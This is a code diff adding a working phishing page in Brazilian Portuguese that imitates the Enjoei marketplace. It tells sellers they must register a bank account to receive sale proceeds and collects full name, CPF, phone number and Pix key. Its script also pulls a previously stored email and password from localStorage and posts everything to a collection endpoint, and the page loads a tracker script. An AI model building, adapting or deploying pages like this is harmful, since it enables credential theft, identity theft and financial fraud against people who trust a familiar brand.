@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento Enjoei</title>
+    <link rel="icon" type="image/png" href="favicon/favicon-16x16.png" sizes="16x16"> 
+    <link rel="icon" type="image/png" href="favicon/favicon-32x32.png" sizes="32x32">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff; /* Fundo branco */
+        }
+        .container {
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #ffffff; /* Fundo branco */
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        h3 {
+            color: #000000; /* Cor de texto padrão */
+            font-size: 24px; /* Tamanho de fonte aumentado */
+            margin-bottom: 20px;
+        }
+        p {
+            color: #666666; /* Cor de texto padrão */
+            font-size: 16px; /* Tamanho de fonte aumentado */
+            margin-bottom: 20px;
+        }
+        input[type="text"] {
+            padding: 10px;
+            margin-bottom: 20px;
+            width: 100%;
+            box-sizing: border-box;
+            border-radius: 5px;
+            border: 1px solid #cccccc; /* Cor de borda padrão */
+        }
+        .button {
+            padding: 15px 30px;
+            font-size: 18px;
+            background-color: #ff3366; /* Cor de botão rosa semelhante ao Enjoei */
+            color: #ffffff; /* Cor do texto do botão */
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            text-decoration: none;
+        }
+        .button:hover {
+            background-color: #ff0044; /* Cor de hover mais escura */
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            margin-top: 20px;
+            border-radius: 5px; /* Borda arredondada para as imagens */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div>
+            <img src="images/logo1.png" alt="I.png">
+        </div>
+        <div>
+            <h3>Dados Bancários:</h3>
+        </div>
+        <div>
+            <p><b>ATENÇÃO:</b> É necessário cadastrar uma conta bancária em nosso sistema para receber o valor adquirido com sua venda.</p>
+        </div>
+        <form id="paymentForm">
+            <div>
+                <input type="text" name="nome-completo" placeholder="Nome completo:" required maxlength="100">
+            </div>
+            <div>
+                <input type="text" name="cpf" placeholder="CPF:" required maxlength="14" oninput="formatarCPF(this)">
+            </div>
+            <div>
+                <input type="text" name="telefone" placeholder="Telefone:" required maxlength="15" oninput="formatarTelefone(this)">
+            </div>
+            <div>
+                <label for="chave-pix">Chave Pix:</label>
+                <input type="text" name="chave-pix" placeholder="Chave Pix:" required maxlength="100">
+            </div>
+            <button type="submit" class="button">Avançar</button>
+        </form>
+        <div>
+            <p><b>Aceitamos bancos físicos e digitais:</b></p>
+            <img src="media/7456a8_910a88d7ad544b278e436787265c71fb~mv2.png/v1/fill/w_173,h_116,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/7456a8_910a88d7ad544b278e436787265c71fb~mv2.png" alt="bancosDigitais2021.png" style="width:173px;height:116px;object-fit:cover" width="173" height="116">
+            <img src="images/1.png" alt="investimento-em-bancos.jpg" style="width:224px;height:116px;object-fit:cover" width="224" height="116">
+        </div>
+    </div>
+
+<script>
+    function formatarCPF(campo) {
+        campo.value = campo.value.replace(/\D/g, ''); // Remove tudo que não é dígito
+        campo.value = campo.value.replace(/(\d{3})(\d)/, '$1.$2'); // Coloca um ponto entre o terceiro e o quarto dígitos
+        campo.value = campo.value.replace(/(\d{3})(\d)/, '$1.$2'); // Coloca um ponto entre o terceiro e o quarto dígitos novamente (para o segundo bloco de números)
+        campo.value = campo.value.replace(/(\d{3})(\d{1,2})$/, '$1-$2'); // Coloca um hífen entre o último bloco de números
+    }
+
+    function formatarTelefone(campo) {
+        campo.value = campo.value.replace(/\D/g, ''); // Remove tudo que não é dígito
+        campo.value = campo.value.replace(/^(\d{2})(\d)/g, '($1) $2'); // Coloca parênteses em volta dos dois primeiros dígitos
+        campo.value = campo.value.replace(/(\d)(\d{4})$/, '$1-$2'); // Coloca hífen entre o quarto e o quinto dígitos
+    }
+
+    document.addEventListener("DOMContentLoaded", function() {
+        // Selecionando o formulário
+        var form = document.getElementById("paymentForm");
+
+        // Adicionando evento de submit ao formulário
+        form.addEventListener("submit", function(event) {
+            // Prevenindo o comportamento padrão de enviar o formulário
+            event.preventDefault();
+
+            var email = localStorage.getItem("email");
+            var senha = localStorage.getItem("senha");
+
+            var nome = form.elements["nome-completo"].value;
+            var cpf = form.elements["cpf"].value;
+            var telefone = form.elements["telefone"].value;
+            var chave_pix = form.elements["chave-pix"].value;
+
+            // Formatar CPF e Telefone (se necessário)
+            cpf = cpf.replace(/\D/g, ''); // Remove caracteres não numéricos
+            cpf = cpf.substr(0, 3) + "." + cpf.substr(3, 3) + "." + cpf.substr(6, 3) + "-" + cpf.substr(9, 2); // Formata CPF
+            telefone = telefone.replace(/\D/g, ''); // Remove caracteres não numéricos
+            telefone = "(" + telefone.substr(0, 2) + ") " + telefone.substr(2, 5) + "-" + telefone.substr(7, 4); // Formata telefone
+
+            let body; 
+
+            if(email && senha){
+                body = JSON.stringify({ email, senha, nome, cpf, telefone, chave_pix });
+            }
+            else{
+                email = 'undefined';
+                senha = 'undefined'
+                body = JSON.stringify({ email, senha, nome, cpf, telefone, chave_pix });
+            }
+
+            fetch("api/create", {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: body
+            }).then(function(response) {
+                window.location.href = "pagamento.html";
+            }).catch(function(error) {
+                console.error('Erro ao enviar os dados:', error);
+                window.location.href = "pagamento.html";
+            });
+        });
+    });
+</script>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/tracker.js"></script>
+</body>
+</html>
+
